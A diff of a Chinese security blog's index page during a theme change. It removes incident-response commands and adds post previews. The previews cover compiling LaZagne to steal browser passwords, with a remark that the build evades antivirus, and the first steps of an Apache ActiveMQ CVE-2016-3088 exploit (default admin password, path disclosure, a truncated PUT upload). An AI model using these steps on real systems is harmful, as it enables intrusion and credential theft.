/etc/cron*</span><br></pre></td></tr></table></figure></p>
-<p>进程分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看本机网络连接情况</span><br><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">#根据netstat定位出pid，使用ps命令分析进程</span><br><span class="line">ps aux | grep pid | grep -v grep</span><br></pre></td></tr></table></figure></p>
-<p>日志分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看系统中所有用户最近一次登陆信息</span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line">#显示用户错误的登陆列表</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">#显示用户最近登陆信息（数据源为/var/log/wtmp、/var/log/btmp）</span><br><span class="line">last</span><br></pre></td></tr></table></figure></p>
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>【开始】-&gt;【运行】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msconfig	//查看开机启动项</span><br><span class="line">%UserProfile%\Recent	//Recent最近打开的文件夹</span><br><span class="line">compmgmt.msc	//计算机管理</span><br><span class="line">eventvwr	//事件管理器</span><br></pre></td></tr></table></figure></p>
-<p>CMD命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#查看当前网络连接</span><br><span class="line">netstat -aon</span><br><span class="line">netstat -aon | findstr ESTABLISHED</span><br><span class="line"></span><br><span class="line">#根据netstat定位pid，根据pid定位进程</span><br><span class="line">tasklist | findstr 1228</span><br><span class="line"></span><br><span class="line">#根据wmic process获取进程的全部路径</span><br><span class="line">wmic process | findstr &quot;xxxx.exe&quot;</span><br><span class="line"></span><br><span class="line">#查看用户信息</span><br><span class="line">net user username</span><br><span class="line"></span><br><span class="line">#查看当前系统用户对话</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">#踢出用户</span><br><span class="line">logoff</span><br><span class="line"></span><br><span class="line">#查看系统版本及补丁信息</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
-<p>系统信息排查：<br>1、查看环境变量<br>2、查看Windows计划<br>3、查看账号信息，如隐藏用户等；</p>
-<p>排查工具：<br>1、PC Hunter<br>2、ProcessExplorer<br>3、Microsoft Network Monitor</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
-
-
-
-          </div>
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">sher10ck</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">87</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">27</span>
-                    <span class="site-state-item-name">标签</span>
-                  
-                </div>
-              
-            </nav>
-          
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://wulidecade.cn" title="https://wulidecade.cn" rel="noopener" target="_blank">Decade</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://mang0.me/" title="http://mang0.me/" rel="noopener" target="_blank">Mang0</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.singll.cc/" title="https://blog.singll.cc/" rel="noopener" target="_blank">Singll</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://timeshu.github.io/" title="https://timeshu.github.io/" rel="noopener" target="_blank">Time</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://hit0on.github.io/" title="https://hit0on.github.io/" rel="noopener" target="_blank">HitOn</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">sher10ck</span>
-
-  
-
-  
 </div>
 
 
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v6.7.0</div>
-
-
-
-
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            五月 12, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/05/12/LaZagne编译抓取浏览器密码/" title="LaZagne编译抓取浏览器密码" class="posttitle">LaZagne编译抓取浏览器密码</a></h3>
         
-
-
-
-
-
-
-
-
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        2k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        2 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+            
         
-      </div>
-    </footer>
+        <div class="md-content animated fadeIn">
+            
+                <p>其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下</p>
+<ul>
+<li>下载地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li>
+<li>编译文档：<a href="https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile</a></li>
+<li>编译好的exe下载：<a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https...</a></li></ul>
+            
+            <span class="read-more"><a href="/2020/05/12/LaZagne编译抓取浏览器密码/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+</div>
 
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
+
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            四月 18, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/" title="Apache ActiveMQ 远程代码执行漏洞复现" class="posttitle">Apache ActiveMQ 远程代码执行漏洞复现</a></h3>
         
-      </div>
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        7.3k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        7 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <ul>
+<li>漏洞编号：CVE-2016-3088</li>
+<li>利用条件：需要登录在admin或者api中，默认密码为admin<br></li>
+</ul>
+<p>首先获取当前路径：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></div></figure></p>
+<p></p>
+<p>然后使用PUT方式写入文件到fileserver这个路径下：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /...</span></pre></td></tr></table></div></figure></p>
+            
+            <span class="read-more"><a href="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+</div>
+
+
+<div class="post" id="post">
+    <div class="post-cover animated fadeIn" style="
+            background-image:
+            radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+            url(/img/welcome-cover.jpg);">
+    </div>
+    <div class="else">
+        <p class="animated fadeInDown">
+            
+                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+            
+            三月 24, 2020
+        </p>
+        <h3 class="post-title animated fadeInDown"><a href="/2020/03/24/应急响应基础知识和命令/" title="应急响应基础知识和命令" class="posttitle">应急响应基础知识和命令</a></h3>
+        
+            <p class="post-count animated fadeInDown">
+                
+                    <span>
+                        <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                        7k
+                    </span>
+                
+                
+                    <span>
+                        <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                        6 mins.
+                    </span>
+                
+                
+            </p>
+            
+                <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/应急响应/">应急响应</a></li></ul>
+            
+        
+        <div class="md-content animated fadeIn">
+            
+                <p>最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。</p>
+<p>好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一些基础的命令、工具和词汇。</p>
+<p>应急一般会有：勒索病毒、挖矿木马、DDoS、APT攻击等。</p>
+<p>不...</p>
+            
+            <span class="read-more"><a href="/2020/03/24/应急响应基础知识和命令/" title="查看全文" class="posttitle">查看全文</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
+        </div>
+    </div>
+</div>
+
+
+    </div>
     
-
+    <div id="pager"><a href="/page/2/" class="more" data-loading="加载中..." data-load-more="加载更多">加载更多</a></div>
     
+</div>
+<div id="preview"></div>
 
-    
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            sher10ck
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
 
-    
-  </div>
-
-  
-
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
 <script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
   }
 </script>
 
 
 
+    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+    <script src="/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
 
 
 
 
 
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Love Sriracha?", "喜欢就多加一点 :)"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=6.7.0"></script>
-
-  <script src="/js/src/motion.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-  
-
-  
-
-
-  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
-
-
-
-  
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
 </html>
